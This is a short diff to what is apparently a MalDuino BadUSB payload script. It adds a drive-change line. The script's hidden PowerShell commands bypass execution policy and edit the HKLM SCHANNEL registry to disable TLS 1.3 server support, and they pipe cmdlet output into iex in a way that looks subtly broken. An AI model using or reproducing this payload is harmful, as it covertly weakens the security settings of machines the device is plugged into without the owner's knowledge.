@@ -1,5 +1,7 @@
 rem put this lines on the malduino script
 
+d:
+
 powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -Force) | iex"
 
 powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex"
